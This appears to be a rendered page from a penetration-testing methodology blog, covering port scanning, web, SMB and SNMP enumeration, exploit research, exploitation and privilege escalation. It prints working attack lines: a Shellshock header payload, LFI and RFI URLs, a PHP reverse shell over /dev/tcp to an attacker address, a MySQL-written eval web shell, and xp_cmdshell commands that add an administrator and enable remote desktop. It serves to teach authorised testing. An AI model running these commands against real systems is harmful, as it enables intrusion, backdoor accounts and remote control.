@@ -1,0 +1,345 @@
+I"Oy<p>The following is a general guideline for how I would start to attack a machine.  I broke it down into enumeration, doing research on what I found, exploitation (either getting root or a low privilege), then attempting low-priv escalation.</p>
+
+<blockquote>
+  <p>NOTE: These are generic guidelines where I have left out anything that is related to Offensive Security’s lab. Still, the following may be helpful if you’re not sure where to start or what to start using to make some progress. Hope it’s helpful for somebody.</p>
+</blockquote>
+
+<h1 id="enumeration">Enumeration</h1>
+<hr />
+<h2 id="network-enumeration">Network Enumeration</h2>
+<p>Network Port Scan - Utilize OneTwoPunch or NMAP to identify any running services on the remote system. Both will default to the 1,000 most popular ports. If you don’t find anything, try a full scan of all 65535 ports.</p>
+
+<p>Create a text file with the IP to be scanned:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# <span class="nb">echo </span>192.168.1.100 <span class="o">&gt;</span> target.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Run onetwopunch.sh against the target to identify open TCP and UDP ports:
+~/onetwopunch.sh -t target.txt -i eth0  (Runs the scan on eth0 against the targets TCP ports.)
+~/onetwopunch.sh -t target.txt -i eth0 -p udp -n -A (Runs the scan on eth0 against the UDP ports and executes the -A flag when running NMAP.)
+~/onetwopunch.sh -t target.txt -i eth0 -n “-A -sV” (Runs the scan with both the -A and -sV flags set for nmap.)</p>
+
+<h3 id="wireshark">Wireshark</h3>
+<p>Wireshark is a network sniffer that collects network traffic and breaks it out into a human readable format. It is very good at showing communications between systems and provides insight into what a system is sending. It can be used to identify windows traffic, sniff for passwords, look for hidden shares and to listen for responses to exploits you are executing over the network. Sometimes an exploit is trying to do something different than you think and it can be helpful to see all of the network traffic to clearly see what communications are going on between your system and the target’s. I find it helpful to have Wireshark running at all times during a pen test so I can review the packets as needed.</p>
+
+<h3 id="port-knocking">Port Knocking</h3>
+<p>Something to be aware of is that some systems have ports that will only become open after a port knocking sequence. This is something that you may be clued into for a system (particularly for CTF machines) but this is also a legitimate technique to hide ports in production systems as well. If you have an idea of what three ports may unlock other ports you can use the following nmap command to initiate the sequence. NOTE: After running this you should perform a full port scan again to see if any ports opened up (they can be odd ports so a top-ports scan is not advised).</p>
+
+<p>Port knocking with nmap: knocks ports 1, 2, 3</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>root@kali:~# nmap 10.10.1.104 <span class="nt">-Pn</span> <span class="nt">-sS</span> <span class="nt">-p</span> 1-3
+root@kali:~# nmap 10.10.1.104 <span class="nt">-p-</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>An additional tool that I use most often for port knocking is knock-knock which is a python script that can be found below.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>https://github.com/pan0pt1c0n/knock-knock
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="dns-enumeration">DNS Enumeration</h2>
+<p>Enumeration of the host names used by systems can help to define and identify the types of servers on a corporate network. If zone transfers are not properly secured, you can pull the entire list of servers by IP and hostname greatly improving the enumeration of a network.</p>
+
+<p>The ‘host’ command is used to query DNS from linux.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# host <span class="nt">-l</span> &lt;domain-name-here&gt; <span class="o">(</span>request a zone transfer from the &lt;domain-name-here&gt; domain<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="web-enumeration">Web Enumeration</h2>
+<p>Use tools to test for vulnerabilities on found web ports. Tools such as nikto, curl, gobuster, dirbuster, and burpsuite can all be used to enumerate any web server vulnerabilities, running software such as PHP, perl, and python, unlinked directories that can be accessed directly and any files within them, documents such as readme that will provide version information etc.</p>
+
+<h3 id="nikto">Nikto</h3>
+<p>Nikto will crawl the webserver looking for known directories and testing for vulnerable settings and software. It can take quite some time but will provide a good idea of places to start testing.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# nikto <span class="nt">-host</span> 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="gobuster-and-dirbuster">Gobuster and Dirbuster</h3>
+<p>Gobuster and dirbuster are directory and file enumeration tools that use a list of file/directory names to brute force test whether they exist on a target system. Both can be used with BurpSuite as their proxy so that the content tested is collected and easily reviewed and tested against. I would recommend always using BurpSuite as the proxy for these tools. Gobuster will be explained here but dirbuster is very similar. Gobuster is better at pinpoint testing against each directory where dirbuster can be used to try to run as many different combinations as possible. I find gobuster more methodical.</p>
+
+<p>Run gobuster against a directory with a provided wordlist, found in the Kali Linux installation and use the local BurpSuite application as a web proxy:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# gobuster <span class="nt">-u</span> http://192.168.1.100/ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web_Content/common.txt <span class="nt">-p</span> http://127.0.0.1:8080
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="curl">Curl</h3>
+<p>Curl is a command line tool to query web servers and other network ports. It is very useful for identifying versions through banner grabs (such as with FTP) as well as parsing web pages into a text readable and command line tool manipulable format. It can also be used to automate attacks that use a URL insertion to simplify actions and make them more repeatable.</p>
+
+<p>Look at the Page Header and What is being Sent:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# curl <span class="nt">-v</span> http://192.168.1.100/cgi-bin/admin.cgi <span class="nt">-s</span> <span class="o">&gt;</span>/dev/null
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Test is you can execute a bash script from a header field:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# curl <span class="nt">-H</span> <span class="s2">"User-Agent: () { :; }; /bin/bash -c 'echo aaaa; uname -a; echo zzzz;'"</span>  http://192.168.1.100/cgi-bin/admin.cgi
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Query a webpage and output it to HTML2Text:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# curl <span class="nt">-vk</span> https://192.168.1.100 | html2text
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Enumerate HTTP methods with curl:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# curl <span class="nt">-vX</span> OPTIONS 192.168.1.100/test
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Quick test with curl of PUT option:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# curl <span class="nt">-vX</span> PUT <span class="nt">-d</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">cat </span>test.txt<span class="si">)</span><span class="s2">"</span> 192.168.1.100/test/test.txt
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="lfirfi-discovery">LFI/RFI Discovery</h3>
+<p>You can potentially detect if there are possible LFI’s or RFI’s via the “fimap” python script.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# fimap.py <span class="nt">-u</span> <span class="s1">'http://192.168.1.100/test.php?file=bang&amp;id=23'</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="wordpress-enumeration">WordPress Enumeration</h2>
+<p>WordPress is commonly used for website presentation through themes. It’s multitude of plugins offer myriad avenues of potential vulnerabilities. Wpscan is a great tool to identify them.</p>
+
+<h3 id="wpscan">wpscan</h3>
+<p>Wpscan identifies the WordPress version and plugins installed and compares them against a list of known vulnerabilities which it lists out. It also provides the name of the current theme.</p>
+
+<p>Check WordPress and its plugins for vulnerabilities:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# wpscan <span class="nt">--url</span> 192.168.1.100 <span class="nt">--enumerate</span> p
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="windows-and-samba-enumeration">Windows and Samba Enumeration</h2>
+<p>Enumeration of windows and samba systems can provide lists of running services, known users, file shares, open network ports and more. If UDP port 135/137 are available, you are likely able to enumerate some items on the target.</p>
+
+<h3 id="enum4linux">Enum4Linux</h3>
+<p>Enum4Linux (e4l) is a perl program that wraps several Samba tools into one. It uses smbclient, rpclient, net and nmblookup to pull as much information from the target as possible.</p>
+
+<p>Run all checks against the target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# enum4linux 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="smb-client">SMB Client</h3>
+<p>SMB Client is a Samba tool used for connecting to remote systems. It can be used to enumerate shares and to connect to them. It is used by e4l to do this very thing. If you find a share you wish to connect with however, you will need to use smbclient directly.</p>
+
+<p>List the network shares on the target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# smbclient <span class="nt">-L</span> 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Connect to the wwwroot share:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# smbclient <span class="se">\\\\</span>192.168.1.100<span class="se">\\</span>wwwroot
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="snmp-enumeration">SNMP Enumeration</h2>
+<p>SNMP tools provide information such as running processes, devices installed, memory information, user accounts, and much more. If SNMP is running it can greatly improve the amount of information known about a system. Snmp-check and snmpwalk are tools that can collect this information.</p>
+
+<h3 id="snmp-check">snmp-check</h3>
+<p>Snmp-check gives a great human readable report on the SNMP information available.</p>
+
+<p>Enumarate the SNMP information on target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# snmp-check 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="snmpwalk">snmpwalk</h3>
+<p>Snmpwalk is a less visually friendly command that can enumerate SNMP available information. It can be used to query specific SNMP strings however and is handy in that regard.</p>
+
+<p>Enumerate SNMP information on target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# snmpwalk <span class="nt">-c</span> public <span class="nt">-v1</span> 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="miscellaneous-enumeration">Miscellaneous Enumeration</h2>
+<p>Some tools can be used to query ports and services in different ways in order to glean more information from them. Netcat and nmap are both capable of running against targets to pull out banners and other information in order to identify the application and its version.</p>
+
+<h3 id="netcat-nc">netcat (nc)</h3>
+<p>Netcat is the swiss army tool of network communication. It can be used to setup listeners, connect to ports, transfer files, initiate remote command lines and more. For enumeration, it is often used to connect to an open port and pull any information it receives, often from the banner.</p>
+
+<p>Query a web server on port 9000:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# nc 192.168.1.100 9000
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="nmap">nmap</h3>
+<p>Nmap is the king of network scanners and has many different functions it can perform including running scripts and shells. It is very good at enumerating ports and is used by the OneTwoPunch (12p) script mentioned above.</p>
+
+<p>Scan the top 1000 TCP ports and then attempt to determine the applications and versions running on open ports:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# nmap 192.168.1.100 <span class="nt">-A</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="html-source">HTML Source</h3>
+<p>I try to view the page source for most home pages and custom web pages looking for comments or version information. It is good practice to check source all the time to help enumerate the website. You can also find hidden form fields and other information as well that can help you to understand how the site operates.</p>
+
+<hr />
+<h1 id="research">Research</h1>
+<h2 id="vulnerability-research-tools">Vulnerability Research Tools</h2>
+<h3 id="searchsploit">Searchsploit</h3>
+<p>Searchsploit is a command line tool that checks the exploit-db database for known vulnerabilities with exploits. It is downloaded to the local system so all of the exploits are available. It can be updated regularly to ensure you have the latest exploits from the exploit-db.com database.</p>
+
+<p>Search for a known exploit for vsftpd.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# searchsploit vsftpd
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="web">Web</h3>
+<h3 id="google">Google</h3>
+<p>This is pretty obvious but worth mentioning, Google will likely bring up the following sites that are explained when searching for exploits but it’s also good to remember that you can refine its searches and it can be used to find weird looking bits of code etc. to help identify what app version you are seeing or to better enumerate what is going on with the target system. Don’t be afraid to search on even the most benign looking bit of text as it could be very specific to a certain application.</p>
+
+<h3 id="cvedetailscom">CVEdetails.com</h3>
+<p>This site provides a list of known vulnerabilities and exploits that can be refined as desired. It shows a score relating to the risk of the item and can be handy in a quick review of vulnerabilities for an application. It can also provide details on what the vuln is and what is needed to exploit it.</p>
+
+<h3 id="exploit-dbcom">Exploit-db.com</h3>
+<p>This is the web site that provides the same information that searchsploit provides, plus things like raw code for the exploit as well as the ability to download the vulnerable version of the software, which can be very helpful in testing. The website requires a captcha to search from it’s main screen but if you search from Google and use site:exploit-db.com you can get to most pages directly. This is one of my favorites.</p>
+
+<h3 id="securityfocuscom">Securityfocus.com</h3>
+<p>This site is kind of a general mixture of CVE and ExDB. It has writeups on vulns and links to exploits. I like it primarily because it may have additional exploits that are not found or easily identified by the others. Specifically I’ve had luck finding a python version of an exploit that was only in ruby or C. This makes it much easier to run.</p>
+
+<hr />
+<h1 id="exploitation">Exploitation</h1>
+<h2 id="sql-injection">SQL Injection</h2>
+<p>SQL Injection is the usage of SQL specific commands and special characters in input fields in order to break the current SQL statement and to insert your own desired statement. It is used in many different ways and changes with the underlying DB OS.</p>
+
+<p>A useful cheat sheet for injections can be found here: <a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/">https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/</a></p>
+
+<h2 id="local-file-inclusion">Local File Inclusion</h2>
+<p>Local File Inclusion or LFI is the calling of a file on the target system in an unexpected manner. It is often done through URL manipulation such as directory traversal.</p>
+
+<p>Example LFI Attack</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>https://192.168.1.100/index.php?page=../../../../../../../etc/passwd
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h2 id="remote-file-inclusion">Remote File Inclusion</h2>
+<p>Remote File Inclusion or RFI is the calling of a remote file, usually from your local system, from the target system. This is often done through URL manipulation.</p>
+
+<p>Example RFI Attack</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>https://192.168.1.100/index.php?page=http://192.168.1.101/shell.php%00 (where 192.168.1.101 is your machine IP)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>This url calls a php file from the remote server, in this instance my attacking box, and executes the file locally to the target system. The %00 terminates the PHP.</p>
+
+<p>The code inside of the file would look something like this:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>&lt;?php print shell_exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.101/443 0&gt;&amp;1");?&gt;
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>It assigns a bash shell to a listener and then initiates a call to my local system on port 443. Running a netcat listener on 443 will accept the reverse shell and I will have a shell with the privileges of the user the web server is running as.</p>
+
+<h2 id="password-attacks">Password Attacks</h2>
+<p>There are many forms of password attacks, hash cracking, password guessing, hash passing, it is important to understand how authentication systems operate to assist in circumventing or compromising them.</p>
+
+<h2 id="hash-cracking">Hash Cracking</h2>
+<p>There are several websites that have publicly available rainbow tables that will take a provided hash and compare. They can be very helpful in finding basic passwords quickly.</p>
+
+<p>Two examples:<br />
+<a href="https://crackstation.net">https://crackstation.net</a><br />
+<a href="https://hashkiller.co.uk">https://hashkiller.co.uk</a></p>
+
+<h3 id="johnny-or-john-the-ripper">Johnny or John the Ripper</h3>
+<p>Johnny is a password cracking program. It is a graphical version of John the Ripper. It can take a wordlist, hash it, then compare it against a list of hashes provided. It can take in files in /etc/passwd /etc/shadow format and identify which hash algorithm is in use. It is very powerful.</p>
+
+<h3 id="password-guessing">Password Guessing</h3>
+<p>One of the quickest ways to compromise a system is to brute force a password. It is also important to try well known combinations, admin:admin, admin:password, and so on. It’s also very helpful to find out what the default username and password is for an application to see if it has been changed or removed.</p>
+
+<p>Brute force tools like Hydra are great for iterating through user and password lists against HTML, SSH, FTP, authentication to start. The command line can be tricky, especially with web authentication, but it is good to know how to use it.</p>
+
+<h3 id="custom-password-lists">Custom Password Lists</h3>
+<p>Use Cewl and John the Ripper to create custom password lists from web sites and other input.</p>
+
+<h2 id="remote-code-execution">Remote Code Execution</h2>
+<p>Remote code execution or RCE is when an attacker is able to run code on a remote system. It can be done through buffer overflow exploits, misconfigured web servers, badly coded applications, and is a very strong method of compromise when it exists.</p>
+
+<h3 id="shellshock-or-bashbug">Shellshock or Bashbug</h3>
+<p>Shellshock takes advantage of an environment variable being passed from an application to the bash shell. Using a specific string to start the variable, () { :; }; , it stops being interpreted as a string and instead as a bash command. This allows the attacker to string along shell commands to be executed by the program.</p>
+
+<p>https://blog.cloudflare.com/inside-shellshock/</p>
+
+<h2 id="anonymous-ftp">Anonymous FTP</h2>
+<p>Anonymous FTP can lead to different attack avenues. If the system has an additional vulnerability in FTP that requires being authenticated, such as a directory traversal attack, then it makes it that much simpler. If the FTP server is configured to allow access to certain directories, for instance the web root, you can upload bind and reverse shells to the web server then execute them through the browser.</p>
+
+<h2 id="smb-shares">SMB Shares</h2>
+<p>SMB Shares that are public can be great avenues for attack. If the share is the web root or part of it, you can upload bind and reverse shells to the system to call from your browser. Tools like enum4linux can identify these shares and smbclient can be used to connect to it directly.</p>
+
+<hr />
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Operating systems have many different vectors for privilege escalation. Some are simple, some are complex, it is worth taking the time to understand how each works so you know what to look for.</p>
+
+<h2 id="windows-escalation">Windows Escalation</h2>
+<ul>
+  <li><a href="http://www.fuzzysecurity.com/tutorials/16.html">Windows Privilege Escalation Fundamentals</a><br /></li>
+  <li><a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows Exploit Suggester</a><br /></li>
+  <li><a href="https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/">Dumping Windows Credentials</a><br /></li>
+</ul>
+
+<h2 id="linux-escalation">Linux Escalation</h2>
+<ul>
+  <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">Basic Linux Privilege Escalation</a><br /></li>
+  <li><a href="https://www.rebootuser.com/?p=1623">Rebootuser Linux Enumeration &amp; Priv Esc</a></li>
+  <li><a href="https://github.com/sleventyeleven/linuxprivchecker">Linux Priv Checker</a><br /></li>
+  <li><a href="https://github.com/rebootuser/LinEnum">LinEnum</a></li>
+</ul>
+
+<h2 id="database-attacks">Database Attacks</h2>
+<p>If you are able to gain access to a database, there are several ways you can use it to your advantage:</p>
+
+<h3 id="mysql-example">MySQL Example<br /></h3>
+<p>If you can connect to a remote MySQL server and get command line access via:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# mysql -u root -p -h 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>You may be able to output a file to disk via the MySQL command line (you can put the base64 payload (from msfvenom, for example) into a select):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>mysql&gt; select "&lt;?PHP eval(base64_decode(&lt;base64-value-here&gt;)); ?&gt;" INTO OUTFILE "../../www/html/shell.php";
+Query OK, 1 row affected (0.00 sec)
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="microsoft-sql-server-example">Microsoft SQL Server Example<br /></h3>
+<p>In the event of Microsoft SQL Server you may want to check whether you can use xp_cmdshell to execute commands. The following is just one example of how you may be able to create a user and enable remote desktop on a victim machine.</p>
+
+<p>Connect to server via sqsh (need to setup configuration in ~/.sqshrc first)</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>root@kali:~# sqsh <span class="nt">-S</span> 192.168.1.100
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Attempt to enable it</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="rouge-code"><pre><span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'show advanced options'</span><span class="p">,</span> <span class="mi">1</span>
+<span class="k">go</span>
+<span class="n">reconfigure</span>
+<span class="k">go</span>
+<span class="k">exec</span> <span class="n">sp_configure</span> <span class="s1">'xp_cmdshell'</span><span class="p">,</span> <span class="mi">1</span>
+<span class="k">go</span>
+<span class="n">reconfigure</span>
+<span class="k">go</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Try to add user</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre></td><td class="rouge-code"><pre><span class="n">xp_cmdshell</span> <span class="s1">'net user testuser password /add'</span>
+<span class="k">go</span>
+<span class="n">xp_cmdshell</span> <span class="s1">'net localgroup Administrators testuser /add'</span>
+<span class="k">go</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Try to enable remote desktop</p>
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre><span class="n">xp_cmdshell</span> <span class="s1">'reg add "HKEY_LOCAL_MACHINE</span><span class="se">\S</span><span class="s1">YSTEM</span><span class="se">\C</span><span class="s1">urrentControlSet</span><span class="se">\C</span><span class="s1">ontrol</span><span class="se">\T</span><span class="s1">erminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</span>
+<span class="k">go</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+:ET
